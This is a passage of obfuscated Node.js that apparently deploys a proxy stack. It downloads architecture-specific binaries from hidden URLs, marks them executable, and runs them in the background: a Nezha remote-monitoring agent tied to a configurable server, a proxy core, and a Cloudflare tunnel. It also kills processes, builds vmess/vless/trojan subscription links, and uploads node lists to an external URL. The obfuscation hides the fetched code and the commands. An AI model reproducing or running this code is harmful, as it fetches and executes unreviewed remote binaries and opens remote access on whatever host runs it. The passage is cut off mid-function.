            }
        }, _0x3b74ed = _0x2dc629[_0x3dd58f(0x15a)](getSystemArchitecture), _0x5a630a = _0x2dc629[_0x3dd58f(0x21b)](getFilesForArchitecture, _0x3b74ed);
    if (_0x2dc629[_0x3dd58f(0xec)](_0x5a630a[_0x3dd58f(0x286)], 0x1fd6 + -0x72 * -0x57 + -0x4694 * 0x1)) {
        console[_0x3dd58f(0x198)](_0x3dd58f(0x150) + _0x3dd58f(0xa8) + _0x3dd58f(0x196) + _0x3dd58f(0xed) + _0x3dd58f(0x195));
        return;
    }
    const _0x40703f = _0x5a630a[_0x3dd58f(0x282)](_0x26ea65 => {
        const _0x4798af = {
            'rOuSl': function (_0x21567f, _0x52e39c) {
                const _0x1160de = _0x1928;
                return _0x2dc629[_0x1160de(0x21b)](_0x21567f, _0x52e39c);
            },
            'IZuFw': function (_0x5c9fdc, _0x55f8b1, _0x31ad28, _0x5a37ab) {
                const _0x30a899 = _0x1928;
                return _0x2dc629[_0x30a899(0xdf)](_0x5c9fdc, _0x55f8b1, _0x31ad28, _0x5a37ab);
            }
        };
        return new Promise((_0x171801, _0x5c73d7) => {
            const _0x2bda55 = _0x1928, _0x557eda = {
                    'zLPpg': function (_0x47205a, _0x465650) {
                        const _0x44559c = _0x1928;
                        return _0x4798af[_0x44559c(0xc0)](_0x47205a, _0x465650);
                    }
                };
            _0x4798af[_0x2bda55(0x128)](downloadFile, _0x26ea65[_0x2bda55(0x274)], _0x26ea65[_0x2bda55(0x21f)], (_0x3e3b6b, _0x1aa6db) => {
                const _0x3cb3aa = _0x2bda55;
                _0x3e3b6b ? _0x557eda[_0x3cb3aa(0x17d)](_0x5c73d7, _0x3e3b6b) : _0x557eda[_0x3cb3aa(0x17d)](_0x171801, _0x1aa6db);
            });
        });
    });
    try {
        await Promise[_0x3dd58f(0x298)](_0x40703f);
    } catch (_0x2e3dc7) {
        console[_0x3dd58f(0x1fd)](_0x2dc629[_0x3dd58f(0x1c7)], _0x2e3dc7);
        return;
    }
    function _0x488567(_0xdb9bc4) {
        const _0x27c8f0 = _0x3dd58f, _0x84ae31 = 0x1947 + 0xc1 * 0x25 + -0x332f;
        _0xdb9bc4[_0x27c8f0(0xb5)](_0x4243f3 => {
            const _0x3bb266 = _0x27c8f0;
            fs[_0x3bb266(0x27d)](_0x4243f3) && fs[_0x3bb266(0xac)](_0x4243f3, _0x84ae31, _0x23b1a3 => {
                const _0x2e870d = _0x3bb266;
                _0x23b1a3 ? console[_0x2e870d(0x1fd)](_0x2e870d(0x190) + _0x2e870d(0x22d) + _0x2e870d(0x208) + _0x4243f3 + ':\x20' + _0x23b1a3) : console[_0x2e870d(0x198)](_0x2e870d(0x190) + _0x2e870d(0x266) + _0x2e870d(0x1dc) + _0x4243f3 + ':\x20' + _0x84ae31[_0x2e870d(0x28c)](0x88 + 0x1165 + -0x11e5));
            });
        });
    }
    const _0xf069cf = NEZHA_PORT ? [
        npmPath,
        webPath,
        botPath
    ] : [
        phpPath,
        webPath,
        botPath
    ];
    _0x2dc629[_0x3dd58f(0x243)](_0x488567, _0xf069cf);
    if (_0x2dc629[_0x3dd58f(0x102)](NEZHA_SERVER, NEZHA_KEY)) {
        if (!NEZHA_PORT) {
            const _0x40d5cd = NEZHA_SERVER[_0x3dd58f(0x112)](':') ? NEZHA_SERVER[_0x3dd58f(0x99)](':')[_0x3dd58f(0x17e)]() : '', _0x9a35fb = new Set([
                    _0x2dc629[_0x3dd58f(0x1f6)],
                    _0x2dc629[_0x3dd58f(0x104)],
                    _0x2dc629[_0x3dd58f(0xf7)],
                    _0x2dc629[_0x3dd58f(0x115)],
                    _0x2dc629[_0x3dd58f(0x1d5)],
                    _0x2dc629[_0x3dd58f(0x91)]
                ]), _0x5e7bfa = _0x9a35fb[_0x3dd58f(0xbd)](_0x40d5cd) ? _0x2dc629[_0x3dd58f(0x1b7)] : _0x2dc629[_0x3dd58f(0x222)], _0x121deb = _0x3dd58f(0xf5) + _0x3dd58f(0x1cd) + NEZHA_KEY + (_0x3dd58f(0x213) + _0x3dd58f(0x98) + _0x3dd58f(0x124) + _0x3dd58f(0x26c) + _0x3dd58f(0xcd) + _0x3dd58f(0xfb) + _0x3dd58f(0x2b0) + _0x3dd58f(0x24f) + _0x3dd58f(0x101) + _0x3dd58f(0x1cb) + _0x3dd58f(0x1ab) + _0x3dd58f(0x237) + _0x3dd58f(0xee) + _0x3dd58f(0xb2) + _0x3dd58f(0x211) + _0x3dd58f(0x108) + _0x3dd58f(0x207) + _0x3dd58f(0x12b) + _0x3dd58f(0x26b) + _0x3dd58f(0xd2) + _0x3dd58f(0xb3) + _0x3dd58f(0x8e)) + NEZHA_SERVER + (_0x3dd58f(0x1d7) + _0x3dd58f(0x176) + _0x3dd58f(0x1ae) + _0x3dd58f(0x1c8) + _0x3dd58f(0xe7) + _0x3dd58f(0x281) + _0x3dd58f(0x185) + _0x3dd58f(0x1d8)) + _0x5e7bfa + (_0x3dd58f(0x21e) + _0x3dd58f(0x18e) + _0x3dd58f(0x280) + _0x3dd58f(0xe1) + _0x3dd58f(0x260) + _0x3dd58f(0x19d) + _0x3dd58f(0x1d0)) + UUID;
            fs[_0x3dd58f(0x103) + _0x3dd58f(0x284)](path[_0x3dd58f(0x28b)](FILE_PATH, _0x2dc629[_0x3dd58f(0x227)]), _0x121deb);
            const _0x570002 = _0x3dd58f(0x173) + phpPath + _0x3dd58f(0x13d) + FILE_PATH + (_0x3dd58f(0x1de) + _0x3dd58f(0x144) + _0x3dd58f(0x16f) + '&');
            try {
                await _0x2dc629[_0x3dd58f(0xa7)](exec, _0x570002), console[_0x3dd58f(0x198)](phpName + (_0x3dd58f(0x10b) + 'g')), await new Promise(_0x58ab50 => setTimeout(_0x58ab50, -0x16 * 0x81 + -0x1086 + 0x2 * 0xfc2));
            } catch (_0x38278a) {
                console[_0x3dd58f(0x1fd)](_0x3dd58f(0x8a) + _0x3dd58f(0xde) + _0x38278a);
            }
        } else {
            let _0x3148af = '';
            const _0x273da8 = [
                _0x2dc629[_0x3dd58f(0x1f6)],
                _0x2dc629[_0x3dd58f(0x104)],
                _0x2dc629[_0x3dd58f(0xf7)],
                _0x2dc629[_0x3dd58f(0x115)],
                _0x2dc629[_0x3dd58f(0x1d5)],
                _0x2dc629[_0x3dd58f(0x91)]
            ];
            _0x273da8[_0x3dd58f(0x112)](NEZHA_PORT) && (_0x3148af = _0x2dc629[_0x3dd58f(0x289)]);
            const _0x2c9d0a = _0x3dd58f(0x173) + npmPath + _0x3dd58f(0xba) + NEZHA_SERVER + ':' + NEZHA_PORT + _0x3dd58f(0x22e) + NEZHA_KEY + '\x20' + _0x3148af + (_0x3dd58f(0x16d) + _0x3dd58f(0x174) + _0x3dd58f(0x180) + _0x3dd58f(0x145) + _0x3dd58f(0x2b2) + _0x3dd58f(0x29b) + _0x3dd58f(0x1ce) + _0x3dd58f(0xb0) + '\x20&');
            try {
                await _0x2dc629[_0x3dd58f(0xc1)](exec, _0x2c9d0a), console[_0x3dd58f(0x198)](npmName + (_0x3dd58f(0x10b) + 'g')), await new Promise(_0x50ef1d => setTimeout(_0x50ef1d, 0xd22 + -0x15e9 + 0xcaf));
            } catch (_0x421105) {
                console[_0x3dd58f(0x1fd)](_0x3dd58f(0x217) + _0x3dd58f(0xde) + _0x421105);
            }
        }
    } else
        console[_0x3dd58f(0x198)](_0x2dc629[_0x3dd58f(0x172)]);
    const _0x5be892 = _0x3dd58f(0x173) + webPath + _0x3dd58f(0x1ee) + FILE_PATH + (_0x3dd58f(0x2a7) + _0x3dd58f(0x17a) + _0x3dd58f(0x16e));
    try {
        await _0x2dc629[_0x3dd58f(0x27e)](exec, _0x5be892), console[_0x3dd58f(0x198)](webName + (_0x3dd58f(0x10b) + 'g')), await new Promise(_0x533e55 => setTimeout(_0x533e55, 0xfea * -0x2 + -0x1 * 0xd8d + 0x3149));
    } catch (_0x31be15) {
        console[_0x3dd58f(0x1fd)](_0x3dd58f(0xd4) + _0x3dd58f(0xde) + _0x31be15);
    }
    if (fs[_0x3dd58f(0x27d)](botPath)) {
        let _0x3e0a23;
        if (ARGO_AUTH[_0x3dd58f(0x23d)](/^[A-Z0-9a-z=]{120,250}$/))
            _0x3e0a23 = _0x3dd58f(0x9c) + _0x3dd58f(0x255) + _0x3dd58f(0xa4) + _0x3dd58f(0x133) + _0x3dd58f(0x163) + _0x3dd58f(0x1dd) + _0x3dd58f(0x12f) + _0x3dd58f(0x29a) + ARGO_AUTH;
        else
            ARGO_AUTH[_0x3dd58f(0x23d)](/TunnelSecret/) ? _0x3e0a23 = _0x3dd58f(0x9c) + _0x3dd58f(0x255) + _0x3dd58f(0xa4) + _0x3dd58f(0x200) + FILE_PATH + (_0x3dd58f(0x1cc) + _0x3dd58f(0x247)) : _0x3e0a23 = _0x3dd58f(0x9c) + _0x3dd58f(0x255) + _0x3dd58f(0xa4) + _0x3dd58f(0x133) + _0x3dd58f(0x163) + _0x3dd58f(0x1dd) + _0x3dd58f(0x23c) + _0x3dd58f(0x1e5) + FILE_PATH + (_0x3dd58f(0x1a4) + _0x3dd58f(0xbe) + _0x3dd58f(0x1ed) + _0x3dd58f(0xc8) + _0x3dd58f(0x181)) + ARGO_PORT;
        try {
            await _0x2dc629[_0x3dd58f(0x243)](exec, _0x3dd58f(0x173) + botPath + '\x20' + _0x3e0a23 + (_0x3dd58f(0x111) + _0x3dd58f(0x1f4))), console[_0x3dd58f(0x198)](botName + (_0x3dd58f(0x10b) + 'g')), await new Promise(_0x50e1e9 => setTimeout(_0x50e1e9, -0x1ce5 * -0x1 + 0x2 * -0x846 + -0x2b * 0x1b));
        } catch (_0x156838) {
            console[_0x3dd58f(0x1fd)](_0x3dd58f(0x20f) + _0x3dd58f(0x262) + _0x3dd58f(0x2ad) + _0x156838);
        }
    }
    await new Promise(_0x21e19c => setTimeout(_0x21e19c, 0x421 * 0x7 + 0x2c2 + -0x1 * 0xc21));
}
function getFilesForArchitecture(_0x52b0d2) {
    const _0x347a7c = _0x17836e, _0x38af79 = {
            'aMYPk': function (_0x4a7559, _0x6f61f2) {
                return _0x4a7559 === _0x6f61f2;
            },
            'pMckg': _0x347a7c(0x253),
            'JFKdh': _0x347a7c(0x116) + _0x347a7c(0x1c3) + _0x347a7c(0xcb),
            'GPiSl': _0x347a7c(0x116) + _0x347a7c(0x1c3) + _0x347a7c(0x12a),
            'zJYBm': _0x347a7c(0x1e1) + _0x347a7c(0x14b) + _0x347a7c(0xcb),
            'PRFQa': _0x347a7c(0x1e1) + _0x347a7c(0x14b) + _0x347a7c(0x12a),
            'DGieZ': function (_0x314968, _0x55a9b5) {
                return _0x314968 && _0x55a9b5;
            },
            'tiehe': function (_0x336278, _0x495baa) {
                return _0x336278 === _0x495baa;
            },
            'PIPlU': _0x347a7c(0x116) + _0x347a7c(0x1c3) + _0x347a7c(0x1ba) + 't',
            'uYIfB': _0x347a7c(0x1e1) + _0x347a7c(0x14b) + _0x347a7c(0x1ba) + 't',
            'BtwBN': _0x347a7c(0x116) + _0x347a7c(0x1c3) + _0x347a7c(0x15f),
            'rRhtK': _0x347a7c(0x1e1) + _0x347a7c(0x14b) + _0x347a7c(0x15f)
        };
    let _0x51cc0f;
    _0x38af79[_0x347a7c(0x106)](_0x52b0d2, _0x38af79[_0x347a7c(0x13b)]) ? _0x51cc0f = [
        {
            'fileName': webPath,
            'fileUrl': _0x38af79[_0x347a7c(0x1c4)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x38af79[_0x347a7c(0x148)]
        }
    ] : _0x51cc0f = [
        {
            'fileName': webPath,
            'fileUrl': _0x38af79[_0x347a7c(0x25b)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x38af79[_0x347a7c(0x204)]
        }
    ];
    if (_0x38af79[_0x347a7c(0x291)](NEZHA_SERVER, NEZHA_KEY)) {
        if (NEZHA_PORT) {
            const _0x43362f = _0x38af79[_0x347a7c(0x21a)](_0x52b0d2, _0x38af79[_0x347a7c(0x13b)]) ? _0x38af79[_0x347a7c(0x122)] : _0x38af79[_0x347a7c(0x88)];
            _0x51cc0f[_0x347a7c(0x221)]({
                'fileName': npmPath,
                'fileUrl': _0x43362f
            });
        } else {
            const _0x45616a = _0x38af79[_0x347a7c(0x106)](_0x52b0d2, _0x38af79[_0x347a7c(0x13b)]) ? _0x38af79[_0x347a7c(0x220)] : _0x38af79[_0x347a7c(0x230)];
            _0x51cc0f[_0x347a7c(0x221)]({
                'fileName': phpPath,
                'fileUrl': _0x45616a
            });
        }
    }
    return _0x51cc0f;
}
function argoType() {
    const _0x17a5d = _0x17836e, _0x5022d2 = {
            'yDghH': function (_0x4e62b3, _0x23adc5) {
                return _0x4e62b3 || _0x23adc5;
            },
            'tdsYR': _0x17a5d(0x11a) + _0x17a5d(0x2ab) + _0x17a5d(0x158) + _0x17a5d(0x24e) + _0x17a5d(0x134) + _0x17a5d(0x244) + 's',
            'DZiDP': _0x17a5d(0x1e3) + 'et',
            'yXsFo': _0x17a5d(0x95) + 'n',
            'tGdVj': _0x17a5d(0xfe),
            'pMbXH': _0x17a5d(0x1b3) + _0x17a5d(0x2a3) + _0x17a5d(0x206) + _0x17a5d(0x250) + _0x17a5d(0x10f) + _0x17a5d(0x97)
        };
    if (_0x5022d2[_0x17a5d(0xf4)](!ARGO_AUTH, !ARGO_DOMAIN)) {
        console[_0x17a5d(0x198)](_0x5022d2[_0x17a5d(0x130)]);
        return;
    }
    if (ARGO_AUTH[_0x17a5d(0x112)](_0x5022d2[_0x17a5d(0x188)])) {
        fs[_0x17a5d(0x103) + _0x17a5d(0x284)](path[_0x17a5d(0x28b)](FILE_PATH, _0x5022d2[_0x17a5d(0x233)]), ARGO_AUTH);
        const _0x5c41a9 = _0x17a5d(0x9d) + '\x20' + ARGO_AUTH[_0x17a5d(0x99)]('\x22')[-0x2 * 0xc09 + 0x12c1 + 0x55c] + (_0x17a5d(0x1d9) + _0x17a5d(0x187) + '\x20') + path[_0x17a5d(0x28b)](FILE_PATH, _0x5022d2[_0x17a5d(0x233)]) + (_0x17a5d(0x272) + _0x17a5d(0x1db) + _0x17a5d(0x2a5) + _0x17a5d(0xa1) + _0x17a5d(0x13f)) + ARGO_DOMAIN + (_0x17a5d(0xe3) + _0x17a5d(0x186) + _0x17a5d(0x2ac) + _0x17a5d(0x192)) + ARGO_PORT + (_0x17a5d(0x25c) + _0x17a5d(0x161) + _0x17a5d(0x13e) + _0x17a5d(0x293) + _0x17a5d(0x1a2) + _0x17a5d(0x197) + _0x17a5d(0x1c1) + _0x17a5d(0x137) + '\x20');
        fs[_0x17a5d(0x103) + _0x17a5d(0x284)](path[_0x17a5d(0x28b)](FILE_PATH, _0x5022d2[_0x17a5d(0x229)]), _0x5c41a9);
    } else
        console[_0x17a5d(0x198)](_0x5022d2[_0x17a5d(0x19b)]);
}
async function extractDomains() {
    const _0x3ea34b = _0x17836e, _0x1e91d3 = {
            'MyNlF': function (_0x31790e, _0x1edd80) {
                return _0x31790e === _0x1edd80;
            },
            'hHPEF': _0x3ea34b(0x17b),
            'aFeYq': function (_0x459eb7, _0x347900) {
                return _0x459eb7(_0x347900);
            },
            'cbMTm': _0x3ea34b(0x1bc) + _0x3ea34b(0x23a) + 'n/',
            'yWYpP': _0x3ea34b(0xc5) + _0x3ea34b(0x171) + _0x3ea34b(0x1f3),
            'Chfhw': function (_0x1152f2, _0x355215) {
                return _0x1152f2 === _0x355215;
            },
            'kTVyo': _0x3ea34b(0x151),
            'HUEgW': _0x3ea34b(0x93),
            'GCAmt': function (_0x203298, _0x1f1688, _0x564900) {
                return _0x203298(_0x1f1688, _0x564900);
            },
            'oTKWb': _0x3ea34b(0xe4),
            'RCYJP': _0x3ea34b(0x1e8) + 'pe',
            'rniOK': _0x3ea34b(0xb6) + _0x3ea34b(0x152) + _0x3ea34b(0x22c),
            'GSilM': _0x3ea34b(0xff),
            'AjXeY': _0x3ea34b(0x236) + _0x3ea34b(0x22f),
            'rrWZR': _0x3ea34b(0x11e),
            'kVKgt': _0x3ea34b(0x164),
            'PZhtu': function (_0x175c35) {
                return _0x175c35();
            },
            'YpLFP': function (_0x4f33b6, _0x107c97) {
                return _0x4f33b6(_0x107c97);
            },
            'mLTNA': function (_0x350b37) {
                return _0x350b37();
            },
            'SMyJj': function (_0x1a0e75, _0x185328) {
                return _0x1a0e75 && _0x185328;
            },
            'UIKQr': _0x3ea34b(0x11a) + 'N:',
            'ZCLYb': function (_0xe81f44, _0x47df2b) {
                return _0xe81f44(_0x47df2b);
            },
            'CwmYT': _0x3ea34b(0x228),
            'YSgwL': _0x3ea34b(0x22c),
            'wylAc': function (_0xf48c90, _0x2b62a8) {
                return _0xf48c90 > _0x2b62a8;
            },
            'dQezc': _0x3ea34b(0x199) + ':',
            'urAGi': _0x3ea34b(0x199) + _0x3ea34b(0x290) + _0x3ea34b(0x288) + _0x3ea34b(0x270) + _0x3ea34b(0x299) + _0x3ea34b(0x120),
            'zSeLB': function (_0x4322b4) {
                return _0x4322b4();
            },
            'iJbmc': function (_0x4308a3, _0x755ebd) {
                return _0x4308a3(_0x755ebd);
            },
            'HKsMv': function (_0x3f70d2) {
                return _0x3f70d2();
            },
            'WYJkH': _0x3ea34b(0x8c) + _0x3ea34b(0x16b) + _0x3ea34b(0x1ef)
        };
    let _0x387f16;
    if (_0x1e91d3[_0x3ea34b(0x218)](ARGO_AUTH, ARGO_DOMAIN))
        _0x387f16 = ARGO_DOMAIN, console[_0x3ea34b(0x198)](_0x1e91d3[_0x3ea34b(0x13c)], _0x387f16), await _0x1e91d3[_0x3ea34b(0x125)](_0xb05ebb, _0x387f16);
    else
        try {
            const _0x408568 = fs[_0x3ea34b(0x285) + 'nc'](path[_0x3ea34b(0x28b)](FILE_PATH, _0x1e91d3[_0x3ea34b(0x156)]), _0x1e91d3[_0x3ea34b(0x193)]), _0x2e28c2 = _0x408568[_0x3ea34b(0x99)]('\x0a'), _0x342f5d = [];
            _0x2e28c2[_0x3ea34b(0xb5)](_0x4416d3 => {
                const _0x5ae378 = _0x3ea34b, _0x50870f = _0x4416d3[_0x5ae378(0x23d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x50870f) {
                    const _0x206119 = _0x50870f[-0xfbd * 0x1 + -0x269c + -0x2 * -0x1b2d];
                    _0x342f5d[_0x5ae378(0x29d)](_0x206119);
                }
            });
            if (_0x1e91d3[_0x3ea34b(0x89)](_0x342f5d[_0x3ea34b(0x286)], -0xd * 0x141 + -0x43 * 0x91 + 0x7 * 0x7c0))
                _0x387f16 = _0x342f5d[0x21de + -0x2 * 0x1069 + 0x4 * -0x43], console[_0x3ea34b(0x198)](_0x1e91d3[_0x3ea34b(0x11f)], _0x387f16), await _0x1e91d3[_0x3ea34b(0x168)](_0xb05ebb, _0x387f16);
            else {
                console[_0x3ea34b(0x198)](_0x1e91d3[_0x3ea34b(0x154)]), fs[_0x3ea34b(0x167)](path[_0x3ea34b(0x28b)](FILE_PATH, _0x1e91d3[_0x3ea34b(0x156)]));
                async function _0x333434() {
                    const _0x2ccf2d = _0x3ea34b;
                    try {
                        _0x1e91d3[_0x2ccf2d(0x132)](process[_0x2ccf2d(0x159)], _0x1e91d3[_0x2ccf2d(0x1c5)]) ? await _0x1e91d3[_0x2ccf2d(0x8b)](exec, _0x2ccf2d(0x265) + _0x2ccf2d(0x28f) + botName + (_0x2ccf2d(0x267) + _0x2ccf2d(0xdd))) : await _0x1e91d3[_0x2ccf2d(0x8b)](exec, _0x2ccf2d(0x1d1) + '[' + botName[_0x2ccf2d(0x1f8)](0x1ee + -0x379 + 0x1 * 0x18b) + ']' + botName[_0x2ccf2d(0x14a)](-0x6b * 0x49 + -0xa08 + 0x288c) + (_0x2ccf2d(0x177) + _0x2ccf2d(0x107)));
                    } catch (_0x2b2f30) {
                    }
                }
                _0x1e91d3[_0x3ea34b(0x127)](_0x333434), await new Promise(_0x386592 => setTimeout(_0x386592, 0x23b * 0x2 + -0x2 * -0xc51 + -0x1160));
                const _0x3f072d = _0x3ea34b(0x9c) + _0x3ea34b(0x255) + _0x3ea34b(0xa4) + _0x3ea34b(0x133) + _0x3ea34b(0x163) + _0x3ea34b(0x1dd) + _0x3ea34b(0x23c) + _0x3ea34b(0x1e5) + FILE_PATH + (_0x3ea34b(0x1a4) + _0x3ea34b(0xbe) + _0x3ea34b(0x1ed) + _0x3ea34b(0xc8) + _0x3ea34b(0x181)) + ARGO_PORT;
                try {
                    await _0x1e91d3[_0x3ea34b(0x13a)](exec, _0x3ea34b(0x173) + botPath + '\x20' + _0x3f072d + (_0x3ea34b(0x111) + _0x3ea34b(0x1f4))), console[_0x3ea34b(0x198)](botName + (_0x3ea34b(0x10b) + 'g')), await new Promise(_0x12959f => setTimeout(_0x12959f, 0x271 * 0xc + -0x2427 + -0x1 * -0x1293)), await _0x1e91d3[_0x3ea34b(0xbf)](extractDomains);
                } catch (_0x381adc) {
                    console[_0x3ea34b(0x1fd)](_0x3ea34b(0x20f) + _0x3ea34b(0x262) + _0x3ea34b(0x2ad) + _0x381adc);
                }
            }
        } catch (_0x388263) {
            console[_0x3ea34b(0x1fd)](_0x1e91d3[_0x3ea34b(0x242)], _0x388263);
        }
    async function _0x343099() {
        const _0x3a4225 = _0x3ea34b;
        try {
            const _0x2debe3 = await axios[_0x3a4225(0x183)](_0x1e91d3[_0x3a4225(0x29e)], { 'timeout': 0xbb8 });
            if (_0x2debe3[_0x3a4225(0xf3)] && _0x2debe3[_0x3a4225(0xf3)][_0x3a4225(0x20a) + 'de'] && _0x2debe3[_0x3a4225(0xf3)][_0x3a4225(0x25d)])
                return _0x2debe3[_0x3a4225(0xf3)][_0x3a4225(0x20a) + 'de'] + '_' + _0x2debe3[_0x3a4225(0xf3)][_0x3a4225(0x25d)];
        } catch (_0x65517d) {
            try {
                const _0x576b1f = await axios[_0x3a4225(0x183)](_0x1e91d3[_0x3a4225(0xae)], { 'timeout': 0xbb8 });
                if (_0x576b1f[_0x3a4225(0xf3)] && _0x1e91d3[_0x3a4225(0x1b2)](_0x576b1f[_0x3a4225(0xf3)][_0x3a4225(0x273)], _0x1e91d3[_0x3a4225(0x114)]) && _0x576b1f[_0x3a4225(0xf3)][_0x3a4225(0x1f9) + 'e'] && _0x576b1f[_0x3a4225(0xf3)][_0x3a4225(0x25d)])
                    return _0x576b1f[_0x3a4225(0xf3)][_0x3a4225(0x1f9) + 'e'] + '_' + _0x576b1f[_0x3a4225(0xf3)][_0x3a4225(0x25d)];
            } catch (_0x3c3311) {
            }
        }
        return _0x1e91d3[_0x3a4225(0x294)];
    }
    async function _0xb05ebb(_0x841e74) {
        const _0x1e2beb = _0x3ea34b, _0x3cf5 = {
                'WfQeU': _0x1e91d3[_0x1e2beb(0xf9)],
                'XjPZE': _0x1e91d3[_0x1e2beb(0x118)],
                'IAviC': _0x1e91d3[_0x1e2beb(0x1ca)],
                'tbEqd': _0x1e91d3[_0x1e2beb(0x29c)],
                'QkcjD': _0x1e91d3[_0x1e2beb(0x109)],
                'HEMyn': _0x1e91d3[_0x1e2beb(0x1a1)],
                'aLcaB': _0x1e91d3[_0x1e2beb(0xd9)],
                'ZeNgT': function (_0x24d7d4) {
                    const _0x3c83fc = _0x1e2beb;
                    return _0x1e91d3[_0x3c83fc(0x21c)](_0x24d7d4);
                },
                'FvIjf': function (_0x4ae3dc, _0x44f720) {
                    const _0x2f0b81 = _0x1e2beb;
                    return _0x1e91d3[_0x2f0b81(0x168)](_0x4ae3dc, _0x44f720);
                }
            }, _0x1c5cd2 = await _0x1e91d3[_0x1e2beb(0x15c)](_0x343099), _0x4e664c = NAME ? NAME + '-' + _0x1c5cd2 : _0x1c5cd2;
        return new Promise(_0x33fdd0 => {
            const _0x2a44e7 = _0x1e2beb;
            _0x1e91d3[_0x2a44e7(0x297)](setTimeout, () => {
                const _0x3ea3dc = _0x2a44e7, _0x4ae7f7 = {
                        'nPvMp': _0x3cf5[_0x3ea3dc(0xf1)],
                        'fdsFs': _0x3cf5[_0x3ea3dc(0xa3)],
                        'irIXc': _0x3cf5[_0x3ea3dc(0x9e)]
                    }, _0x482662 = {
                        'v': '2',
                        'ps': '' + _0x4e664c,
                        'add': CFIP,
                        'port': CFPORT,
                        'id': UUID,
                        'aid': '0',
                        'scy': _0x3cf5[_0x3ea3dc(0x28d)],
                        'net': 'ws',
                        'type': _0x3cf5[_0x3ea3dc(0x28d)],
                        'host': _0x841e74,
                        'path': _0x3cf5[_0x3ea3dc(0x296)],
                        'tls': _0x3cf5[_0x3ea3dc(0x170)],
                        'sni': _0x841e74,
                        'alpn': '',
                        'fp': _0x3cf5[_0x3ea3dc(0xc7)]
                    }, _0x372dd8 = _0x3ea3dc(0x1fe) + UUID + '@' + CFIP + ':' + CFPORT + (_0x3ea3dc(0x25f) + _0x3ea3dc(0x25e) + _0x3ea3dc(0x2b3) + _0x3ea3dc(0x1b5)) + _0x841e74 + (_0x3ea3dc(0x18f) + _0x3ea3dc(0x202) + _0x3ea3dc(0xd6)) + _0x841e74 + (_0x3ea3dc(0x139) + _0x3ea3dc(0x239) + _0x3ea3dc(0x216) + '0#') + _0x4e664c + _0x3ea3dc(0x8d) + Buffer[_0x3ea3dc(0xa0)](JSON[_0x3ea3dc(0xef)](_0x482662))[_0x3ea3dc(0x28c)](_0x3cf5[_0x3ea3dc(0xf1)]) + (_0x3ea3dc(0x9f) + '/') + UUID + '@' + CFIP + ':' + CFPORT + (_0x3ea3dc(0x1a0) + _0x3ea3dc(0xb7)) + _0x841e74 + (_0x3ea3dc(0x18f) + _0x3ea3dc(0x202) + _0x3ea3dc(0xd6)) + _0x841e74 + (_0x3ea3dc(0x1b9) + _0x3ea3dc(0x11c) + _0x3ea3dc(0xb9) + _0x3ea3dc(0x1ea)) + _0x4e664c + _0x3ea3dc(0xbb);
                console[_0x3ea3dc(0x198)](Buffer[_0x3ea3dc(0xa0)](_0x372dd8)[_0x3ea3dc(0x28c)](_0x3cf5[_0x3ea3dc(0xf1)])), fs[_0x3ea3dc(0x103) + _0x3ea3dc(0x284)](subPath, Buffer[_0x3ea3dc(0xa0)](_0x372dd8)[_0x3ea3dc(0x28c)](_0x3cf5[_0x3ea3dc(0xf1)])), console[_0x3ea3dc(0x198)](FILE_PATH + (_0x3ea3dc(0x26d) + _0x3ea3dc(0x1b8) + _0x3ea3dc(0x1bb))), _0x3cf5[_0x3ea3dc(0x249)](uploadNodes), app[_0x3ea3dc(0x183)]('/' + SUB_PATH, (_0x362fa8, _0x230b42) => {
                    const _0x5e5ebb = _0x3ea3dc, _0xdb7a7c = Buffer[_0x5e5ebb(0xa0)](_0x372dd8)[_0x5e5ebb(0x28c)](_0x4ae7f7[_0x5e5ebb(0xea)]);
                    _0x230b42[_0x5e5ebb(0x105)](_0x4ae7f7[_0x5e5ebb(0x1d6)], _0x4ae7f7[_0x5e5ebb(0xc6)]), _0x230b42[_0x5e5ebb(0x189)](_0xdb7a7c);
                }), _0x3cf5[_0x3ea3dc(0x258)](_0x33fdd0, _0x372dd8);
            }, -0x1 * 0x208b + 0x4f7 + 0x2364);
        });
    }
}
async function uploadNodes() {
    const _0x34002c = _0x17836e, _0x37fc4d = {
            'NXhVR': function (_0x28a7ff, _0x1f4187) {
                return _0x28a7ff && _0x1f4187;
            },
            'LBiaQ': _0x34002c(0x22a) + _0x34002c(0xbc),
            'maipK': function (_0xcf1039, _0xe9fa7) {
                return _0xcf1039 === _0xe9fa7;
            },
            'jfRlD': _0x34002c(0x18a) + _0x34002c(0x1b4) + _0x34002c(0x1ec) + _0x34002c(0x23b),
            'XDzpI': _0x34002c(0x22c),
            'hgpxm': function (_0x54043c, _0x2ad887) {
                return _0x54043c === _0x2ad887;
            },
            'NEvHz': _0x34002c(0x1e0) + _0x34002c(0x1c2) + _0x34002c(0x1bb)
        };
    if (_0x37fc4d[_0x34002c(0x254)](UPLOAD_URL, PROJECT_URL)) {
        const _0x490833 = PROJECT_URL + '/' + SUB_PATH, _0x58ebdf = { 'subscription': [_0x490833] };
        try {
            const _0x13a093 = await axios[_0x34002c(0x143)](UPLOAD_URL + (_0x34002c(0x138) + _0x34002c(0x275) + 'ns'), _0x58ebdf, { 'headers': { 'Content-Type': _0x37fc4d[_0x34002c(0xaf)] } });
            return _0x13a093 && _0x37fc4d[_0x34002c(0x23f)](_0x13a093[_0x34002c(0x273)], 0x14 * 0x100 + -0x2 * 0xbb1 + -0x2 * -0x215) ? (console[_0x34002c(0x198)](_0x37fc4d[_0x34002c(0xdc)]), _0x13a093) : null;
        } catch (_0xfc6ce3) {
            if (_0xfc6ce3[_0x34002c(0x257)]) {
                if (_0x37fc4d[_0x34002c(0x23f)](_0xfc6ce3[_0x34002c(0x257)][_0x34002c(0x273)], -0xcc6 + -0x83 * -0x19 + 0x18b)) {
                }
            }
        }
    } else {
        if (UPLOAD_URL) {
            if (!fs[_0x34002c(0x27d)](listPath))
                return;
            const _0x21ce03 = fs[_0x34002c(0x285) + 'nc'](listPath, _0x37fc4d[_0x34002c(0x142)]), _0x346c5c = _0x21ce03[_0x34002c(0x99)]('\x0a')[_0x34002c(0x10c)](_0x31f11d => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x34002c(0xc2)](_0x31f11d));
            if (_0x37fc4d[_0x34002c(0x23f)](_0x346c5c[_0x34002c(0x286)], -0x1ee9 * 0x1 + -0x2 * -0x6f5 + 0x10ff))
                return;
            const _0xc5cea1 = JSON[_0x34002c(0xef)]({ 'nodes': _0x346c5c });
            try {
